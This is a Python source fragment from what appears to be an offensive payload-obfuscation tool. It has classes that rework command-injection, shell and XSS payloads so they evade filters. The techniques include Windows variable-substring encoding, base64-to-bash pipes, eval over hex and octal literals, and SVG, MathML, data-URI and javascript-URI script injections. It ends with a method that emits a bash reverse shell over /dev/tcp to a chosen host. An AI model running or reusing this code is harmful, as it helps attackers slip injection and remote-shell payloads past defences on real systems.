            self.obfuscate_double_query,
            self.obfuscate_info_schema_alt,
            self.obfuscate_system_table_alt,
        ]
        random.shuffle(methods)
        variants: List[str] = []
        for method in methods[:count]:
            try:
                variants.append(method(payload))
            except Exception as exc:
                logger.warning("SQL variant generation failed: %s", exc)
        return variants

    def get_stats(self) -> Dict[str, int]:
        with self._lock:
            return dict(self._stats)


# ════════════════════════════════════════════════════════════════════════════════
# CMD OBFUSCATOR
# ════════════════════════════════════════════════════════════════════════════════

class CMDObfuscator:
    """
    CMD/Batch payload obfuscation engine.

    Provides 10+ techniques for Windows CMD and Unix command-line
    payload transformation including variable expansion, IFS
    manipulation, brace expansion, and process substitution.

    Usage:
        obf = CMDObfuscator()
        result = obf.obfuscate_variable_expansion("whoami")
        print(result)  # %ComSpec:~14,1%%ComSpec:~24,1%...
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._stats: Dict[str, int] = defaultdict(int)
        # Windows environment variable character map for variable expansion
        self._win_charmap: Dict[str, str] = {
            "c": "%ComSpec:~0,1%",
            "m": "%ComSpec:~7,1%",
            "d": "%ComSpec:~8,1%",
            "e": "%ComSpec:~9,1%",
            "x": "%ComSpec:~10,1%",
            ".": "%ComSpec:~11,1%",
            "w": "%windir:~0,1%",
            "i": "%windir:~1,1%",
            "n": "%windir:~2,1%",
            "o": "%windir:~4,1%",
            "s": "%windir:~5,1%",
            "\\": "%windir:~3,1%",
            "p": "%PSModulePath:~0,1%",
            "r": "%PSModulePath:~13,1%",
            "a": "%ALLUSERSPROFILE:~0,1%",
            "l": "%ALLUSERSPROFILE:~1,1%",
            "u": "%ALLUSERSPROFILE:~3,1%",
        }
        logger.debug("CMDObfuscator initialized")

    # ── Variable Expansion %var:~0,1% ────────────────────────────────────
    def obfuscate_variable_expansion(self, payload: str) -> str:
        """Build commands via Windows variable substring expansion."""
        with self._lock:
            self._stats["variable_expansion"] += 1
            result_parts: List[str] = []
            for ch in payload.lower():
                if ch in self._win_charmap:
                    result_parts.append(self._win_charmap[ch])
                else:
                    result_parts.append(ch)
            return "".join(result_parts)

    def obfuscate_variable_expansion_set(self, payload: str) -> str:
        """Use SET command to define variables for character extraction."""
        with self._lock:
            self._stats["variable_expansion_set"] += 1
            var = _random_var_name()[:4].upper()
            lines = [f"set {var}={payload}"]
            # Build call via character-by-character extraction
            call_parts: List[str] = []
            for i, ch in enumerate(payload):
                call_parts.append(f"%{var}:~{i},1%")
            lines.append("".join(call_parts))
            return " && ".join(lines)

    # ── IFS Manipulation ─────────────────────────────────────────────────
    def obfuscate_ifs_manipulation(self, payload: str) -> str:
        """Manipulate Internal Field Separator for command splitting."""
        with self._lock:
            self._stats["ifs_manipulation"] += 1
            delimiter = random.choice([",", ".", ":", ";", "|"])
            encoded = delimiter.join(payload)
            var = _random_var_name()
            return f"IFS='{delimiter}';{var}=\"{encoded}\";eval $(echo ${var}|tr '{delimiter}' ' ')"

    def obfuscate_ifs_newline(self, payload: str) -> str:
        """Use newline as IFS for obfuscation."""
        with self._lock:
            self._stats["ifs_newline"] += 1
            var = _random_var_name()
            parts = list(payload)
            return (
                f"IFS=$'\\n';{var}=$(printf '%s\\n' "
                + " ".join(f"'{c}'" for c in parts)
                + f");eval $(echo ${var}|tr -d '\\n')"
            )

    # ── Brace Expansion {e,c,h,o} ───────────────────────────────────────
    def obfuscate_brace_expansion(self, payload: str) -> str:
        """Use brace expansion to construct command strings."""
        with self._lock:
            self._stats["brace_expansion"] += 1
            # Split payload into words
            words = payload.split()
            result_parts: List[str] = []
            for word in words:
                if len(word) > 1:
                    brace = "{" + ",".join(word) + "}"
                    result_parts.append(f"$(echo {brace}|tr -d ' ')")
                else:
                    result_parts.append(word)
            return " ".join(result_parts)

    def obfuscate_brace_printf(self, payload: str) -> str:
        """Brace expansion with printf for reconstruction."""
        with self._lock:
            self._stats["brace_printf"] += 1
            words = payload.split()
            result_parts: List[str] = []
            for word in words:
                chars = ",".join(word)
                result_parts.append(f"$(printf '%s' {{{chars}}})")
            return " ".join(result_parts)

    # ── $() Nesting ──────────────────────────────────────────────────────
    def obfuscate_subshell_nesting(self, payload: str) -> str:
        """Nest command substitution via $() for obfuscation."""
        with self._lock:
            self._stats["subshell_nesting"] += 1
            encoded_b64 = base64.b64encode(payload.encode()).decode()
            return f"$(echo $(echo '{encoded_b64}'|base64 -d))"

    def obfuscate_subshell_deep(self, payload: str) -> str:
        """Deep nested $() substitution."""
        with self._lock:
            self._stats["subshell_deep"] += 1
            var = _random_var_name()
            inner = f"$(echo '{payload}')"
            for _ in range(random.randint(2, 4)):
                inner = f"$(echo {inner})"
            return inner

    # ── Backtick Nesting ─────────────────────────────────────────────────
    def obfuscate_backtick_nesting(self, payload: str) -> str:
        """Use nested backtick command substitution."""
        with self._lock:
            self._stats["backtick_nesting"] += 1
            return f"`echo `echo '{payload}'``"

    def obfuscate_backtick_hex(self, payload: str) -> str:
        """Backtick with hex-encoded echo."""
        with self._lock:
            self._stats["backtick_hex"] += 1
            hex_payload = "".join(f"\\x{ord(c):02x}" for c in payload)
            return f"`echo -e '{hex_payload}'`"

    # ── Backslash Line Continuation ──────────────────────────────────────
    def obfuscate_backslash_continuation(self, payload: str) -> str:
        """Split commands across lines via backslash continuation."""
        with self._lock:
            self._stats["backslash_continuation"] += 1
            result_parts: List[str] = []
            for i, ch in enumerate(payload):
                result_parts.append(ch)
                if i < len(payload) - 1 and random.random() < 0.3:
                    result_parts.append("\\\n")
            return "".join(result_parts)

    # ── Variable Substitution ${cmd} ─────────────────────────────────────
    def obfuscate_variable_substitution(self, payload: str) -> str:
        """Store commands in variables and expand them."""
        with self._lock:
            self._stats["variable_substitution"] += 1
            words = payload.split()
            var_defs: List[str] = []
            var_refs: List[str] = []
            for i, word in enumerate(words):
                var = _random_var_name()
                var_defs.append(f"{var}='{word}'")
                var_refs.append(f"${{{var}}}")
            return ";".join(var_defs) + ";" + " ".join(var_refs)

    def obfuscate_variable_char_by_char(self, payload: str) -> str:
        """Store each character in a separate variable."""
        with self._lock:
            self._stats["variable_char_by_char"] += 1
            var_prefix = _random_var_name()[:3]
            defs: List[str] = []
            refs: List[str] = []
            for i, ch in enumerate(payload):
                var = f"{var_prefix}{i}"
                defs.append(f"{var}='{ch}'")
                refs.append(f"${{{var}}}")
            return ";".join(defs) + ";eval " + "".join(refs)

    # ── Indirect Expansion ───────────────────────────────────────────────
    def obfuscate_indirect_expansion(self, payload: str) -> str:
        """Use indirect variable reference for command construction."""
        with self._lock:
            self._stats["indirect_expansion"] += 1
            var_name = _random_var_name()
            ref_var = _random_var_name()
            return f"{var_name}='{payload}';{ref_var}={var_name};eval ${{{ref_var}}}"

    def obfuscate_indirect_nameref(self, payload: str) -> str:
        """Use bash nameref (declare -n) for indirection."""
        with self._lock:
            self._stats["indirect_nameref"] += 1
            var = _random_var_name()
            ref = _random_var_name()
            return f"{var}='{payload}';declare -n {ref}={var};eval ${ref}"

    # ── Arithmetic Expansion Abuse ───────────────────────────────────────
    def obfuscate_arithmetic_abuse(self, payload: str) -> str:
        """Abuse arithmetic expansion $(( )) for obfuscation."""
        with self._lock:
            self._stats["arithmetic_abuse"] += 1
            char_constructs: List[str] = []
            for ch in payload:
                code = ord(ch)
                a = random.randint(1, code - 1)
                b = code - a
                char_constructs.append(f"$(printf '\\\\$(printf '%03o' $(({a}+{b})))')")
            return "eval " + "".join(char_constructs)

    def obfuscate_arithmetic_octal(self, payload: str) -> str:
        """Arithmetic expansion with octal character construction."""
        with self._lock:
            self._stats["arithmetic_octal"] += 1
            parts: List[str] = []
            for ch in payload:
                octal_val = oct(ord(ch))[2:]
                parts.append(f"$'\\{octal_val}'")
            return "eval " + "".join(parts)

    # ── Process Substitution ─────────────────────────────────────────────
    def obfuscate_process_substitution(self, payload: str) -> str:
        """Use process substitution <() for indirect execution."""
        with self._lock:
            self._stats["process_substitution"] += 1
            encoded = base64.b64encode(payload.encode()).decode()
            return f"bash <(echo '{encoded}'|base64 -d)"

    def obfuscate_process_fd(self, payload: str) -> str:
        """Process substitution with file descriptor."""
        with self._lock:
            self._stats["process_fd"] += 1
            return f"exec 3< <(echo '{payload}');cat <&3|bash"

    # ── Combined ─────────────────────────────────────────────────────────
    def obfuscate_combined(self, payload: str, level: ObfuscationLevel) -> str:
        """Apply multiple CMD techniques based on level."""
        with self._lock:
            self._stats["combined"] += 1
            lv = _level_value(level)
            result = payload
            if lv >= 1:
                result = self.obfuscate_backslash_continuation(result)
            if lv >= 2:
                result = self.obfuscate_variable_substitution(result)
            if lv >= 3:
                encoded = base64.b64encode(result.encode()).decode()
                result = f"echo '{encoded}'|base64 -d|bash"
            if lv >= 4:
                result = self.obfuscate_arithmetic_abuse(payload)
            return result

    def get_all_variants(self, payload: str, count: int = 10) -> List[str]:
        """Generate multiple CMD obfuscation variants."""
        methods: List[Callable] = [
            self.obfuscate_variable_expansion,
            self.obfuscate_variable_expansion_set,
            self.obfuscate_ifs_manipulation,
            self.obfuscate_brace_expansion,
            self.obfuscate_brace_printf,
            self.obfuscate_subshell_nesting,
            self.obfuscate_subshell_deep,
            self.obfuscate_backtick_nesting,
            self.obfuscate_backtick_hex,
            self.obfuscate_backslash_continuation,
            self.obfuscate_variable_substitution,
            self.obfuscate_variable_char_by_char,
            self.obfuscate_indirect_expansion,
            self.obfuscate_arithmetic_abuse,
            self.obfuscate_arithmetic_octal,
            self.obfuscate_process_substitution,
        ]
        random.shuffle(methods)
        variants: List[str] = []
        for method in methods[:count]:
            try:
                variants.append(method(payload))
            except Exception as exc:
                logger.warning("CMD variant generation failed: %s", exc)
        return variants

    def get_stats(self) -> Dict[str, int]:
        with self._lock:
            return dict(self._stats)


# ════════════════════════════════════════════════════════════════════════════════
# HTML OBFUSCATOR
# ════════════════════════════════════════════════════════════════════════════════

class HTMLObfuscator:
    """
    HTML payload obfuscation engine.

    Provides 12+ techniques for HTML/XSS payload transformation
    including entity encoding, SVG/MathML namespace abuse,
    data: URI, javascript: URI, and custom element exploitation.

    Usage:
        obf = HTMLObfuscator()
        result = obf.obfuscate_entity_decimal("<script>alert(1)</script>")
        print(result)  # &#60;&#115;&#99;...
    """

    # Named HTML entities mapping
    NAMED_ENTITIES: Dict[str, str] = {
        "<": "&lt;", ">": "&gt;", "&": "&amp;", '"': "&quot;",
        "'": "&apos;", "/": "&sol;", "!": "&excl;", "=": "&equals;",
        "(": "&lpar;", ")": "&rpar;", " ": "&nbsp;", "+": "&plus;",
        "-": "&minus;", "*": "&ast;", ".": "&period;", ",": "&comma;",
        ":": "&colon;", ";": "&semi;", "?": "&quest;", "#": "&num;",
        "%": "&percnt;", "@": "&commat;", "~": "&tilde;", "`": "&grave;",
        "^": "&Hat;", "|": "&vert;", "{": "&lbrace;", "}": "&rbrace;",
        "[": "&lbrack;", "]": "&rbrack;",
    }

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._stats: Dict[str, int] = defaultdict(int)
        logger.debug("HTMLObfuscator initialized")

    # ── Entity Encoding: Decimal ─────────────────────────────────────────
    def obfuscate_entity_decimal(self, payload: str) -> str:
        """Encode characters as decimal HTML entities &#NNN;."""
        with self._lock:
            self._stats["entity_decimal"] += 1
            return "".join(f"&#{ord(c)};" for c in payload)

    def obfuscate_entity_decimal_padded(self, payload: str) -> str:
        """Decimal entities with zero-padding &#00NNN;."""
        with self._lock:
            self._stats["entity_decimal_padded"] += 1
            padding = random.randint(4, 7)
            return "".join(f"&#{ord(c):0{padding}d};" for c in payload)

    def obfuscate_entity_decimal_no_semicolon(self, payload: str) -> str:
        """Decimal entities without trailing semicolon (browser-parsed)."""
        with self._lock:
            self._stats["entity_decimal_no_semi"] += 1
            return "".join(f"&#{ord(c)}" for c in payload)

    # ── Entity Encoding: Hex ─────────────────────────────────────────────
    def obfuscate_entity_hex(self, payload: str) -> str:
        """Encode characters as hex HTML entities &#xHH;."""
        with self._lock:
            self._stats["entity_hex"] += 1
            return "".join(f"&#x{ord(c):x};" for c in payload)

    def obfuscate_entity_hex_padded(self, payload: str) -> str:
        """Hex entities with zero-padding &#x00HH;."""
        with self._lock:
            self._stats["entity_hex_padded"] += 1
            padding = random.randint(3, 6)
            return "".join(f"&#x{ord(c):0{padding}x};" for c in payload)

    def obfuscate_entity_hex_uppercase(self, payload: str) -> str:
        """Hex entities with uppercase hex digits."""
        with self._lock:
            self._stats["entity_hex_upper"] += 1
            return "".join(f"&#x{ord(c):X};" for c in payload)

    # ── Entity Encoding: Named ───────────────────────────────────────────
    def obfuscate_entity_named(self, payload: str) -> str:
        """Use named HTML entities where available."""
        with self._lock:
            self._stats["entity_named"] += 1
            result: List[str] = []
            for c in payload:
                if c in self.NAMED_ENTITIES:
                    result.append(self.NAMED_ENTITIES[c])
                else:
                    result.append(c)
            return "".join(result)

    def obfuscate_entity_mixed(self, payload: str) -> str:
        """Mix decimal, hex, and named entities randomly."""
        with self._lock:
            self._stats["entity_mixed"] += 1
            result: List[str] = []
            for c in payload:
                choice = random.randint(0, 2)
                if choice == 0:
                    result.append(f"&#{ord(c)};")
                elif choice == 1:
                    result.append(f"&#x{ord(c):x};")
                else:
                    result.append(self.NAMED_ENTITIES.get(c, c))
            return "".join(result)

    # ── Attribute Event Handlers Without Quotes ──────────────────────────
    def obfuscate_event_no_quotes(self, payload: str) -> str:
        """Create event handler attributes without quote delimiters."""
        with self._lock:
            self._stats["event_no_quotes"] += 1
            events = [
                "onload", "onerror", "onfocus", "onblur", "onclick",
                "onmouseover", "onmouseout", "onsubmit", "oninput",
                "onchange", "ondblclick", "onkeypress", "onkeydown",
            ]
            event = random.choice(events)
            tag = random.choice(["img", "body", "input", "div", "svg", "details"])
            extra = ""
            if tag == "img":
                extra = " src=x"
            elif tag == "input":
                extra = " autofocus"
            elif tag == "details":
                extra = " open"
            return f"<{tag}{extra} {event}={payload}>"

    def obfuscate_event_encoded(self, payload: str) -> str:
        """Event handler with HTML entity encoded payload."""
        with self._lock:
            self._stats["event_encoded"] += 1
            encoded = "".join(f"&#x{ord(c):x};" for c in payload)
            events = ["onerror", "onload", "onfocus", "onmouseover"]
            event = random.choice(events)
            return f'<img src=x {event}="{encoded}">'

    # ── SVG Namespace Abuse ──────────────────────────────────────────────
    def obfuscate_svg_namespace(self, payload: str) -> str:
        """Embed scripts via SVG elements."""
        with self._lock:
            self._stats["svg_namespace"] += 1
            return f"<svg onload={payload}>"

    def obfuscate_svg_animate(self, payload: str) -> str:
        """SVG animate element for script execution."""
        with self._lock:
            self._stats["svg_animate"] += 1
            return (
                f'<svg><animate onbegin={payload} attributeName=x dur=1s>'
                f'</animate></svg>'
            )

    def obfuscate_svg_set(self, payload: str) -> str:
        """SVG set element for script execution."""
        with self._lock:
            self._stats["svg_set"] += 1
            return f'<svg><set onbegin={payload} attributeName=x to=1></set></svg>'

    def obfuscate_svg_foreignobject(self, payload: str) -> str:
        """SVG foreignObject for HTML injection."""
        with self._lock:
            self._stats["svg_foreignobject"] += 1
            return (
                f'<svg><foreignObject><body onload={payload}>'
                f'</body></foreignObject></svg>'
            )

    def obfuscate_svg_use(self, payload: str) -> str:
        """SVG use element with external reference."""
        with self._lock:
            self._stats["svg_use"] += 1
            b64 = base64.b64encode(
                f'<svg onload="{payload}"></svg>'.encode()
            ).decode()
            return f'<svg><use href="data:image/svg+xml;base64,{b64}#x"></use></svg>'

    # ── MathML Namespace Abuse ───────────────────────────────────────────
    def obfuscate_mathml_namespace(self, payload: str) -> str:
        """Embed scripts via MathML elements."""
        with self._lock:
            self._stats["mathml_namespace"] += 1
            return (
                f'<math><mtext><table><mglyph><style>'
                f'<!--</style><img src=x onerror={payload}>-->'
                f'</style></mglyph></table></mtext></math>'
            )

    def obfuscate_mathml_annotation(self, payload: str) -> str:
        """MathML annotation-xml for HTML injection."""
        with self._lock:
            self._stats["mathml_annotation"] += 1
            return (
                f'<math><annotation-xml encoding="text/html">'
                f'<img src=x onerror={payload}>'
                f'</annotation-xml></math>'
            )

    # ── data: URI ────────────────────────────────────────────────────────
    def obfuscate_data_uri(self, payload: str) -> str:
        """Embed payload via data: URI scheme."""
        with self._lock:
            self._stats["data_uri"] += 1
            html_content = f"<script>{payload}</script>"
            b64 = base64.b64encode(html_content.encode()).decode()
            return f'<iframe src="data:text/html;base64,{b64}"></iframe>'

    def obfuscate_data_uri_plain(self, payload: str) -> str:
        """data: URI without base64 encoding."""
        with self._lock:
            self._stats["data_uri_plain"] += 1
            html_content = f"<script>{payload}</script>"
            encoded = "".join(f"%{ord(c):02X}" for c in html_content)
            return f'<iframe src="data:text/html,{encoded}"></iframe>'

    def obfuscate_data_uri_object(self, payload: str) -> str:
        """data: URI via object tag."""
        with self._lock:
            self._stats["data_uri_object"] += 1
            html_content = f"<script>{payload}</script>"
            b64 = base64.b64encode(html_content.encode()).decode()
            return f'<object data="data:text/html;base64,{b64}"></object>'

    # ── javascript: URI with Encoding ────────────────────────────────────
    def obfuscate_javascript_uri(self, payload: str) -> str:
        """Use javascript: URI with various encodings."""
        with self._lock:
            self._stats["javascript_uri"] += 1
            return f'<a href="javascript:{payload}">click</a>'

    def obfuscate_javascript_uri_encoded(self, payload: str) -> str:
        """javascript: URI with URL encoding."""
        with self._lock:
            self._stats["javascript_uri_encoded"] += 1
            encoded = "".join(f"%{ord(c):02X}" for c in payload)
            return f'<a href="javascript:{encoded}">click</a>'

    def obfuscate_javascript_uri_entity(self, payload: str) -> str:
        """javascript: URI with HTML entity encoding."""
        with self._lock:
            self._stats["javascript_uri_entity"] += 1
            js_prefix = "".join(f"&#x{ord(c):x};" for c in "javascript:")
            return f'<a href="{js_prefix}{payload}">click</a>'

    def obfuscate_javascript_uri_tab(self, payload: str) -> str:
        """javascript: URI with tab/newline insertion."""
        with self._lock:
            self._stats["javascript_uri_tab"] += 1
            # Insert tabs/newlines within "javascript:" prefix
            obfuscated_prefix = "j\ta\nv\ta\ns\nc\tr\ti\tp\tt\n:"
            return f'<a href="{obfuscated_prefix}{payload}">click</a>'

    # ── Meta Refresh ─────────────────────────────────────────────────────
    def obfuscate_meta_refresh(self, payload: str) -> str:
        """Use meta http-equiv=refresh for redirection with payload."""
        with self._lock:
            self._stats["meta_refresh"] += 1
            b64 = base64.b64encode(
                f"<script>{payload}</script>".encode()
            ).decode()
            return (
                f'<meta http-equiv="refresh" '
                f'content="0;url=data:text/html;base64,{b64}">'
            )

    def obfuscate_meta_refresh_javascript(self, payload: str) -> str:
        """Meta refresh with javascript: URI."""
        with self._lock:
            self._stats["meta_refresh_js"] += 1
            return (
                f'<meta http-equiv="refresh" '
                f'content="0;url=javascript:{payload}">'
            )

    # ── Base Tag Manipulation ────────────────────────────────────────────
    def obfuscate_base_tag(self, payload: str) -> str:
        """Manipulate base tag to redirect relative URLs."""
        with self._lock:
            self._stats["base_tag"] += 1
            b64 = base64.b64encode(
                f"<script>{payload}</script>".encode()
            ).decode()
            return (
                f'<base href="data:text/html;base64,{b64}//">'
                f'<a href="">click</a>'
            )

    def obfuscate_base_tag_javascript(self, payload: str) -> str:
        """Base tag with javascript: scheme."""
        with self._lock:
            self._stats["base_tag_js"] += 1
            return f'<base href="javascript:{payload}//">'

    # ── Template Tag ─────────────────────────────────────────────────────
    def obfuscate_template_tag(self, payload: str) -> str:
        """Hide payload inside template tag content."""
        with self._lock:
            self._stats["template_tag"] += 1
            var = _random_var_name()
            return (
                f'<template id="{var}"><script>{payload}</script></template>'
                f'<script>document.body.appendChild('
                f'document.getElementById("{var}").content.cloneNode(true))</script>'
            )

    def obfuscate_template_innerhtml(self, payload: str) -> str:
        """Template tag with innerHTML extraction."""
        with self._lock:
            self._stats["template_innerhtml"] += 1
            var = _random_var_name()
            encoded = "".join(f"&#x{ord(c):x};" for c in payload)
            return (
                f'<template id="{var}">{encoded}</template>'
                f'<script>eval(document.getElementById("{var}").'
                f'content.textContent)</script>'
            )

    # ── Custom Element Abuse ─────────────────────────────────────────────
    def obfuscate_custom_element(self, payload: str) -> str:
        """Abuse custom HTML elements for script execution."""
        with self._lock:
            self._stats["custom_element"] += 1
            tag_name = f"x-{_random_var_name()}"
            return (
                f'<{tag_name} onfocus={payload} autofocus tabindex=1>'
                f'</{tag_name}>'
            )

    def obfuscate_custom_element_is(self, payload: str) -> str:
        """Custom element with is= attribute extension."""
        with self._lock:
            self._stats["custom_element_is"] += 1
            return (
                f'<div is="x-{_random_var_name()}" '
                f'onfocus={payload} autofocus tabindex=1></div>'
            )

    # ── Combined ─────────────────────────────────────────────────────────
    def obfuscate_combined(self, payload: str, level: ObfuscationLevel) -> str:
        """Apply multiple HTML techniques based on level."""
        with self._lock:
            self._stats["combined"] += 1
            lv = _level_value(level)
            if lv == 1:
                return self.obfuscate_event_no_quotes(payload)
            elif lv == 2:
                encoded = self.obfuscate_entity_hex(payload)
                return f'<img src=x onerror="{encoded}">'
            elif lv == 3:
                return self.obfuscate_svg_foreignobject(payload)
            else:
                inner = self.obfuscate_entity_hex(payload)
                b64 = base64.b64encode(
                    f'<img src=x onerror="{inner}">'.encode()
                ).decode()
                return (
                    f'<svg><foreignObject><iframe src="data:text/html;base64,'
                    f'{b64}"></iframe></foreignObject></svg>'
                )

    def get_all_variants(self, payload: str, count: int = 10) -> List[str]:
        """Generate multiple HTML obfuscation variants."""
        methods: List[Callable] = [
            self.obfuscate_entity_decimal,
            self.obfuscate_entity_decimal_padded,
            self.obfuscate_entity_hex,
            self.obfuscate_entity_hex_padded,
            self.obfuscate_entity_named,
            self.obfuscate_entity_mixed,
            self.obfuscate_event_no_quotes,
            self.obfuscate_event_encoded,
            self.obfuscate_svg_namespace,
            self.obfuscate_svg_animate,
            self.obfuscate_svg_foreignobject,
            self.obfuscate_mathml_namespace,
            self.obfuscate_mathml_annotation,
            self.obfuscate_data_uri,
            self.obfuscate_data_uri_plain,
            self.obfuscate_javascript_uri,
            self.obfuscate_javascript_uri_encoded,
            self.obfuscate_meta_refresh,
            self.obfuscate_base_tag,
            self.obfuscate_template_tag,
            self.obfuscate_custom_element,
        ]
        random.shuffle(methods)
        variants: List[str] = []
        for method in methods[:count]:
            try:
                variants.append(method(payload))
            except Exception as exc:
                logger.warning("HTML variant generation failed: %s", exc)
        return variants

    def get_stats(self) -> Dict[str, int]:
        with self._lock:
            return dict(self._stats)


# ════════════════════════════════════════════════════════════════════════════════
# SHELL OBFUSCATOR
# ════════════════════════════════════════════════════════════════════════════════

class ShellObfuscator:
    """
    Shell/Bash payload obfuscation engine.

    Provides 11+ techniques for Unix shell payload transformation
    including PATH slicing, printf, base64 pipe, here strings,
    file descriptor redirection, and /dev/tcp abuse.

    Usage:
        obf = ShellObfuscator()
        result = obf.obfuscate_base64_pipe("id")
        print(result)  # echo 'aWQ='|base64 -d|bash
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._stats: Dict[str, int] = defaultdict(int)
        logger.debug("ShellObfuscator initialized")

    # ── ${PATH:0:1} Slicing ──────────────────────────────────────────────
    def obfuscate_path_slice(self, payload: str) -> str:
        """Extract characters from environment variables via slicing."""
        with self._lock:
            self._stats["path_slice"] += 1
            # Map common chars to known env var positions
            env_chars: Dict[str, List[str]] = {
                "/": ["${PATH:0:1}", "${HOME:0:1}"],
                ":": ["${PATH:4:1}"],
                "b": ["${SHELL:0:1}", "${BASH:0:1}"],
                "a": ["${BASH:1:1}", "${PATH:5:1}"],
                "s": ["${SHELL:4:1}", "${BASH:2:1}"],
                "h": ["${SHELL:5:1}", "${HOME:1:1}"],
                "i": ["${SHELL:7:1}", "${PATH:8:1}"],
                "n": ["${SHELL:3:1}", "${HOSTNAME:0:1}"],
                "u": ["${USER:0:1}", "${SHELL:6:1}"],
                "e": ["${SHELL:9:1}", "${HOME:3:1}"],
                "r": ["${TERM:2:1}", "${USER:2:1}"],
                "t": ["${TERM:0:1}", "${PATH:11:1}"],
                "l": ["${SHELL:8:1}", "${PATH:14:1}"],
                "o": ["${HOME:2:1}", "${HOSTNAME:1:1}"],
                "p": ["${PATH:16:1}"],
                "c": ["${SHELL:10:1}"],
                "d": ["${HOME:4:1}", "${PWD:0:1}"],
                "w": ["${PWD:1:1}"],
            }
            parts: List[str] = []
            for ch in payload:
                ch_lower = ch.lower()
                if ch_lower in env_chars:
                    parts.append(random.choice(env_chars[ch_lower]))
                else:
                    parts.append(f"$(printf '\\x{ord(ch):02x}')")
            return "eval " + "".join(parts)

    # ── $'\x41' Hex Literal ──────────────────────────────────────────────
    def obfuscate_dollar_hex(self, payload: str) -> str:
        """Use $'\\xHH' ANSI-C quoting for hex character literals."""
        with self._lock:
            self._stats["dollar_hex"] += 1
            hex_chars = "".join(f"\\x{ord(c):02x}" for c in payload)
            return f"eval $'{hex_chars}'"

    def obfuscate_dollar_hex_split(self, payload: str) -> str:
        """Split hex literal into concatenated parts."""
        with self._lock:
            self._stats["dollar_hex_split"] += 1
            parts: List[str] = []
            for ch in payload:
                parts.append(f"$'\\x{ord(ch):02x}'")
            return "eval " + "".join(parts)

    # ── echo -e ──────────────────────────────────────────────────────────
    def obfuscate_echo_e(self, payload: str) -> str:
        """Use echo -e with escape sequences for string construction."""
        with self._lock:
            self._stats["echo_e"] += 1
            hex_str = "".join(f"\\x{ord(c):02x}" for c in payload)
            return f"eval $(echo -e '{hex_str}')"

    def obfuscate_echo_e_octal(self, payload: str) -> str:
        """echo -e with octal escape sequences."""
        with self._lock:
            self._stats["echo_e_octal"] += 1
            octal_str = "".join(f"\\{oct(ord(c))[2:]:>03}" for c in payload)
            return f"eval $(echo -e '{octal_str}')"

    # ── printf ───────────────────────────────────────────────────────────
    def obfuscate_printf(self, payload: str) -> str:
        """Use printf with format specifiers for string construction."""
        with self._lock:
            self._stats["printf"] += 1
            hex_str = "".join(f"\\x{ord(c):02x}" for c in payload)
            return f"eval $(printf '{hex_str}')"

    def obfuscate_printf_decimal(self, payload: str) -> str:
        """printf with decimal format specifiers."""
        with self._lock:
            self._stats["printf_decimal"] += 1
            parts = " ".join(f"$(printf '\\\\$(printf '%03o' {ord(c)})')" for c in payload)
            return f"eval {parts}"

    def obfuscate_printf_args(self, payload: str) -> str:
        """printf with separate character arguments."""
        with self._lock:
            self._stats["printf_args"] += 1
            fmt = "".join("%c" for _ in payload)
            args = " ".join(str(ord(c)) for c in payload)
            return f"eval $(printf '{fmt}' $(echo {args} | tr ' ' '\\n' | while read n; do printf \"\\\\$(printf '%o' $n)\"; done))"

    # ── xxd Reverse ──────────────────────────────────────────────────────
    def obfuscate_xxd_reverse(self, payload: str) -> str:
        """Encode payload as hex dump and reverse via xxd -r."""
        with self._lock:
            self._stats["xxd_reverse"] += 1
            hex_str = payload.encode().hex()
            return f"echo '{hex_str}'|xxd -r -p|bash"

    def obfuscate_xxd_postscript(self, payload: str) -> str:
        """xxd in postscript (plain hex) mode."""
        with self._lock:
            self._stats["xxd_postscript"] += 1
            hex_str = payload.encode().hex()
            return f"echo '{hex_str}'|xxd -r -ps|bash"

    # ── rev Pipe ─────────────────────────────────────────────────────────
    def obfuscate_rev_pipe(self, payload: str) -> str:
        """Reverse payload string and pipe through rev command."""
        with self._lock:
            self._stats["rev_pipe"] += 1
            reversed_payload = payload[::-1]
            return f"echo '{reversed_payload}'|rev|bash"

    def obfuscate_rev_double(self, payload: str) -> str:
        """Double reversal for deeper obfuscation."""
        with self._lock:
            self._stats["rev_double"] += 1
            reversed_payload = payload[::-1]
            return f"bash -c \"$(echo '{reversed_payload}'|rev)\""

    # ── base64 Pipe ──────────────────────────────────────────────────────
    def obfuscate_base64_pipe(self, payload: str) -> str:
        """Base64 encode payload and decode via base64 -d pipe."""
        with self._lock:
            self._stats["base64_pipe"] += 1
            b64 = base64.b64encode(payload.encode()).decode()
            return f"echo '{b64}'|base64 -d|bash"

    def obfuscate_base64_eval(self, payload: str) -> str:
        """Base64 decode into eval."""
        with self._lock:
            self._stats["base64_eval"] += 1
            b64 = base64.b64encode(payload.encode()).decode()
            return f"eval $(echo '{b64}'|base64 -d)"

    def obfuscate_base64_nested(self, payload: str) -> str:
        """Double base64 encoding."""
        with self._lock:
            self._stats["base64_nested"] += 1
            b64_1 = base64.b64encode(payload.encode()).decode()
            b64_2 = base64.b64encode(b64_1.encode()).decode()
            return f"echo '{b64_2}'|base64 -d|base64 -d|bash"

    # ── Here String ──────────────────────────────────────────────────────
    def obfuscate_here_string(self, payload: str) -> str:
        """Pass payload via here string (<<<) to commands."""
        with self._lock:
            self._stats["here_string"] += 1
            return f"bash <<< '{payload}'"

    def obfuscate_here_doc(self, payload: str) -> str:
        """Pass payload via here document."""
        with self._lock:
            self._stats["here_doc"] += 1
            delimiter = _random_var_name().upper()
            return f"bash << '{delimiter}'\n{payload}\n{delimiter}"

    # ── File Descriptor Redirection ──────────────────────────────────────
    def obfuscate_fd_redirect(self, payload: str) -> str:
        """Use file descriptor manipulation for indirect execution."""
        with self._lock:
            self._stats["fd_redirect"] += 1
            fd = random.randint(3, 9)
            b64 = base64.b64encode(payload.encode()).decode()
            return (
                f"exec {fd}< <(echo '{b64}'|base64 -d);"
                f"cat <&{fd}|bash;exec {fd}<&-"
            )

    def obfuscate_fd_proc(self, payload: str) -> str:
        """File descriptor via /proc/self/fd."""
        with self._lock:
            self._stats["fd_proc"] += 1
            b64 = base64.b64encode(payload.encode()).decode()
            return f"echo '{b64}'|base64 -d > /proc/self/fd/1 | bash"

    # ── /dev/tcp Abuse ───────────────────────────────────────────────────
    def obfuscate_dev_tcp(self, payload: str, host: str = "127.0.0.1",
                          port: int = 8080) -> str:
        """Use /dev/tcp for network-based payload delivery."""
        with self._lock:
            self._stats["dev_tcp"] += 1
            return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"

